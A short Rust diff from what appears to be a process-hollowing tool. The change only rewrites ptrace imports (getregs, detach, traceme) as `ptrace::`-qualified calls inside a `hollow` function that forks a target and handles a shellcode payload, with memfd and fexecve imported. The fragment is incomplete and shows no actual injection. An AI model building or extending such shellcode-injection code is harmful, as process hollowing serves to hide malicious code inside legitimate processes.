@@ -4,7 +4,6 @@ use std::os::fd::AsRawFd;
 use nix::errno::Errno;
 use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
 use nix::sys::ptrace;
-use nix::sys::ptrace::{detach, getregs, traceme};
 use nix::sys::wait::waitpid;
 use nix::unistd;
 use nix::unistd::{execve, fexecve, fork, ForkResult};
@@ -23,7 +22,7 @@ pub fn hollow(payload: Payload) -> Result<(), Errno> {
                     todo!()
                 }
                 PayloadType::Shellcode => {
-                    let regs = getregs(child)?;
+                    let regs = ptrace::getregs(child)?;
 
                     let mut addr = regs.rip;
 
@@ -32,13 +31,13 @@ pub fn hollow(payload: Payload) -> Result<(), Errno> {
                         addr += 1;
                     }
 
-                    detach(child, None)?;
+                    ptrace::detach(child, None)?;
                 }
             }
         }
 
         Ok(ForkResult::Child) => {
-            traceme()?;
+            ptrace::traceme()?;
 
             let target_c_string = CString::new(payload.target).unwrap();
 
